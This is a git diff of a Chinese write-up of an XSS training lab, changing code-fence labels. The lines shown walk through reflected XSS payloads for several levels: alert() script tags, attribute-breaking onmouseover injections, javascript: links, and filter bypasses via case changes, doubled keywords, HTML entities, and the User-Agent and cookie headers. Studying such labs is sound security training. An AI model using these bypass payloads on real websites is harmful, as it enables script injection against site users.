@@ -17,7 +17,7 @@ echo "<h2 align=center>欢迎用户".$str."</h2>";
 ```
 
 这一关没有什么过滤，它会将我们的name值在网页中输出，所以我们尝试注入：
-```
+```html
 <script>alert(1)</script>
 ```
 
@@ -27,7 +27,7 @@ echo "<h2 align=center>欢迎用户".$str."</h2>";
 
 ![Pasted image 20240826195628.png](/img/user/picture/Pasted%20image%2020240826195628.png)
 先构造一个测试payload：
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 
@@ -54,7 +54,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 >- `'` 转换为 `&#039;`（这是在双引号内使用时）
 
 所以我们可以尝试将输入框中的内容进行闭合
-```
+```html
 "><script>alert(111)</script>"<
 ```
 
@@ -64,7 +64,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 ![Pasted image 20240826200044.png](/img/user/picture/Pasted%20image%2020240826200044.png)
 
 依旧用测试payload看一下
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 ![Pasted image 20240826200114.png](/img/user/picture/Pasted%20image%2020240826200114.png)
@@ -80,7 +80,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 由于htmlspecialchars默认配置是**不过滤单引号**的，于是想到构造单引号的payload。
 
-```
+```html
 'onmouseover='alert(1)
 ```
 移动鼠标到输入框触发onmouseover事件，过关！
@@ -89,33 +89,33 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 # Level 4
 ![Pasted image 20240826201105.png](/img/user/picture/Pasted%20image%2020240826201105.png)
 先用测试代码看一下
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 ![Pasted image 20240826201130.png](/img/user/picture/Pasted%20image%2020240826201130.png)
 发现下面输入框过滤了我们的尖括号`<>`
 所以我们可以调整一下第三题的payload，并且闭合双引号
 
-```
+```html
 "onmouseover='alert(1)'
 ```
 
 # Level 5(绕过检测<script和on事件)
 ![Pasted image 20240826201331.png](/img/user/picture/Pasted%20image%2020240826201331.png)
 测试payload看一下：
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 
 ![Pasted image 20240826201442.png](/img/user/picture/Pasted%20image%2020240826201442.png)
 发现好像啥也没少
 用之前的payload测试一下：
-```
+```html
 "><script>alert("xss");</script>
 ```
 ![Pasted image 20240826201714.png](/img/user/picture/Pasted%20image%2020240826201714.png)
 
-```
+```html
 "onmouseover='alert(1)'
 ```
 ![Pasted image 20240826201759.png](/img/user/picture/Pasted%20image%2020240826201759.png)
@@ -124,7 +124,7 @@ echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.
 
 这一题可以用javascript伪协议来实现
 payload:
-```
+```html
 "><a href="javascript:alert(`xss`);">xss</a>
 ```
 
@@ -134,7 +134,7 @@ payload:
 ![Pasted image 20240826202233.png](/img/user/picture/Pasted%20image%2020240826202233.png)
 
 还是测试一下：
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 
@@ -142,14 +142,14 @@ payload:
 
 
 用上一关的payload试一下：
-```
+```html
 "><a href="javascript:alert(`xss`);">xss</a>
 ```
 ![Pasted image 20240826210514.png](/img/user/picture/Pasted%20image%2020240826210514.png)
 发现href关键词也被过滤了
 
 用另一个试一下：
-```
+```html
 sd"></br><img src="javascript:alert('1');">
 ```
 ![Pasted image 20240826210653.png](/img/user/picture/Pasted%20image%2020240826210653.png)
@@ -157,7 +157,7 @@ sd"></br><img src="javascript:alert('1');">
 
 这题可以用大小写绕过
 
-```
+```html
 "><a hRef="javascript:alert(`xss`);">xss</a>
 ```
 
@@ -168,13 +168,13 @@ sd"></br><img src="javascript:alert('1');">
 ![Pasted image 20240826210829.png](/img/user/picture/Pasted%20image%2020240826210829.png)
 
 我们用上一关的payload试一下：
-```
+```html
 "><a hRef="javascript:alert(`xss`);">xss</a>
 ```
 ![Pasted image 20240826211150.png](/img/user/picture/Pasted%20image%2020240826211150.png)
 发现`href`和`script`关键词没有了
 我们试一下双写可不可以绕过：
-```
+```html
 "><a hRehReff="javascrscriptipt:alert(`xss`);">xss</a>
 ```
 成功
@@ -187,7 +187,7 @@ sd"></br><img src="javascript:alert('1');">
 
 ![Pasted image 20240826211915.png](/img/user/picture/Pasted%20image%2020240826211915.png)
 发现这里有一个超链接，我们尝试用伪协议利用一下
-```
+```html
 javascript:alert(`xss`);
 ```
 ![Pasted image 20240826212008.png](/img/user/picture/Pasted%20image%2020240826212008.png)
@@ -198,7 +198,7 @@ javascript:alert(`xss`);
 t   &#116
 :   &#58
 
-```
+```html
 javascrip&#116:alert(`xss`);
 ```
 
@@ -208,7 +208,7 @@ javascrip&#116:alert(`xss`);
 ![Pasted image 20240826212213.png](/img/user/picture/Pasted%20image%2020240826212213.png)
 
 尝试一下测试payload：
-```
+```html
 '';!--"<XSS>=&{()}
 ```
 ![Pasted image 20240826212448.png](/img/user/picture/Pasted%20image%2020240826212448.png)
@@ -220,7 +220,7 @@ javascrip&#116:alert(`xss`);
 好吧，要有关键词`http://`
 
 我们修改一下上一关payload：
-```
+```html
 javascrip&#116:alert(`http://`);
 ```
 
@@ -243,18 +243,18 @@ javascrip&#116:alert(`http://`);
 <input name="t_sort"  value="" type="hidden">
 ```
 有三个输入框？为什么type为hidden？hidden 的意思为定义隐藏的输入字段。尝试使用firebug将hidden全改成submit。出现一个按钮，点击发现URL变成
-```
+```html
 http://10.10.10.135/xss/level10.php?t_link=&t_history=&t_sort=
 ```
 
 
 尝试构造xss语句：
-```
+```html
 http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 ```
 
 查看网页源代码：
-```
+```html
 <input name="t_link"  value="" type="hidden">
 <input name="t_history"  value="" type="hidden">
 <input name="t_sort"  value="3" type="hidden">
@@ -262,7 +262,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 
 发现只有t_sort参数才有返回数据。
 
-```
+```html
 ?t_sort=3"onmouseover='alert(1)' type="text"
 ```
 
@@ -297,7 +297,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 ![Pasted image 20240827195144.png](/img/user/picture/Pasted%20image%2020240827195144.png)
 这题看样子就是将我们的UA头进行了保存
 所以说我们在UA头加入如下payload即可
-```
+```html
 "onmouseover='alert(1)' type="text"
 ```
 
@@ -310,7 +310,7 @@ http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
 
 所以我们直接抓包在cookie中加入payload即可
 ![Pasted image 20240827200609.png](/img/user/picture/Pasted%20image%2020240827200609.png)
-```
+```html
 "onmouseover='alert(1)' type="text"
 ```
 
